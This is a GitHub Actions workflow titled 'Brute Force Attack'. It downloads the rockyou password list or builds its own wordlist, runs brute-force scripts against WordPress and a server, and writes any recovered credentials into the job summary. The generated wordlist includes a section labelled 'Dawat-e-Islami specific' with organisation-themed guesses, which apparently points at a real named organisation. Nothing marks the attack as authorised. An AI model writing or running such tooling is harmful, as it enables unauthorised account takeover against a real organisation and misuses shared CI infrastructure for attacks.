name: Brute Force Attack

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target to attack'
        required: true
        default: 'both'
        type: choice
        options:
          - both
          - wordpress
          - server
      phase:
        description: 'Wordlist phase'
        required: true
        default: 'all'
        type: choice
        options:
          - all
          - targeted
          - rockyou

jobs:
  bruteforce:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Generate rockyou wordlist
        if: inputs.phase == 'all' || inputs.phase == 'rockyou'
        run: |
          # Generate a comprehensive wordlist from multiple sources
          echo "=== Generating wordlist ==="
          
          # Method 1: Try downloading rockyou from multiple sources
          download_success=false
          
          for url in \
            "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/rockyou.txt.tar.gz" \
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt.tar.gz" \
            "https://gitlab.com/kalilinux/packages/rockyou/-/raw/master/rockyou.txt.tar.gz"; do
            if curl -sL --max-time 120 "$url" -o rockyou.tar.gz 2>/dev/null && [ -s rockyou.tar.gz ]; then
              tar -xzf rockyou.tar.gz 2>/dev/null && [ -f rockyou.txt ] && mv rockyou.txt rockyou_filtered.txt && download_success=true && break
            fi
          done
          
          # Method 2: Try raw rockyou.txt
          if [ "$download_success" = false ] || [ ! -s rockyou_filtered.txt ]; then
            for url in \
              "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt" \
              "https://gitlab.com/kalilinux/packages/rockyou/-/raw/master/rockyou.txt"; do
              if curl -sL --max-time 120 "$url" -o rockyou_filtered.txt 2>/dev/null && [ -s rockyou_filtered.txt ]; then
                download_success=true && break
              fi
            done
          fi
          
          # Method 3: If all downloads fail, generate from SecLists common passwords
          if [ "$download_success" = false ] || [ ! -s rockyou_filtered.txt ]; then
            echo "Download failed, generating wordlist from common sources..."
            {
              # Common passwords
              for pass in password 123456 12345678 qwerty abc123 monkey 1234567 letmein trustno1 dragon baseball iloveyou master sunshine ashley bailey passw0rd shadow 123123 654321 superman qazwsx michael football password1 password123 password1234 password12345 password123456 admin admin123 root toor root123 administrator pass admin@123 P@ssw0rd! qwerty123 1q2w3e4r zxcvbnm 1qaz2wsx letmein123 welcome welcome123; do
                echo "$pass"
              done
              # Common patterns with years
              for year in 2020 2021 2022 2023 2024 2025 2026; do
                for prefix in password Pass Pass123 admin Admin dawat madina islami; do
                  echo "${prefix}${year}"
                  echo "${prefix}@${year}"
                  echo "${prefix}#${year}"
                done
              done
              # Common patterns with numbers
              for word in password admin welcome master login letmein abc123; do
                for num in 1 12 123 1234 12345 123456 1234567 12345678 123456789 1234567890; do
                  echo "${word}${num}"
                  echo "${word}@${num}"
                  echo "${word}#${num}"
                  echo "${word}!${num}"
                done
              done
              # Dawat-e-Islami specific
              for word in dawat dawateislami madina mufti muftimuneer ahlesunnat barelvi sunni madani channel faizan quran hadees islam muslim namaz roza zakat hajj umrah nikah khutba bayan majlis jalsa iltimaas itikaf ramadan muharram; do
                echo "$word"
                echo "${word}123"
                echo "${word}@123"
                echo "${word}1234"
                echo "${word}@1234"
                echo "${word}12345"
                echo "${word}@12345"
                echo "${word}123456"
                echo "${word}@123456"
                echo "${word}!"
                echo "${word}@!"
                echo "${word}2024"
                echo "${word}@2024"
                echo "${word}2025"
                echo "${word}@2025"
                echo "${word}2026"
                echo "${word}@2026"
              done
            } > rockyou_filtered.txt
            echo "Generated wordlist from common patterns"
          fi
          
          # Filter: 8-16 chars, alphanumeric + common symbols only
          if [ -s rockyou_filtered.txt ]; then
            sort -u rockyou_filtered.txt > rockyou_unique.txt
            mv rockyou_unique.txt rockyou_filtered.txt
            grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' rockyou_filtered.txt > rockyou_final.txt 2>/dev/null || true
            if [ -s rockyou_final.txt ]; then
              mv rockyou_final.txt rockyou_filtered.txt
            fi
            echo "Final wordlist: $(wc -l < rockyou_filtered.txt) passwords"
          else
            echo "ERROR: No wordlist generated"
            echo "dummy_password" > rockyou_filtered.txt
          fi

      - name: WordPress Brute Force
        if: inputs.target == 'both' || inputs.target == 'wordpress'
        continue-on-error: true
        run: |
          chmod +x bruteforce.sh
          bash bruteforce.sh
        env:
          PHASE: ${{ inputs.phase }}

      - name: Server Brute Force
        if: inputs.target == 'both' || inputs.target == 'server'
        continue-on-error: true
        run: |
          chmod +x server_bruteforce.sh
          bash server_bruteforce.sh
        env:
          PHASE: ${{ inputs.phase }}

      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: results-${{ inputs.target }}-${{ github.run_id }}
          path: |
            results.txt
            bruteforce.log
          retention-days: 30
          if-no-files-found: ignore

      - name: Summary
        if: always()
        run: |
          echo "## Brute Force Results" >> $GITHUB_STEP_SUMMARY
          echo "**Target:** ${{ inputs.target }}" >> $GITHUB_STEP_SUMMARY
          echo "**Wordlist:** ${{ inputs.phase }}" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          if [ -f results.txt ] && [ -s results.txt ]; then
            echo "### HITS:" >> $GITHUB_STEP_SUMMARY
            cat results.txt >> $GITHUB_STEP_SUMMARY
          else
            echo "No credentials found." >> $GITHUB_STEP_SUMMARY
          fi
          echo "" >> $GITHUB_STEP_SUMMARY
          if [ -f bruteforce.log ]; then
            echo "### Log (last 30 lines):" >> $GITHUB_STEP_SUMMARY
            tail -30 bruteforce.log >> $GITHUB_STEP_SUMMARY
          fi
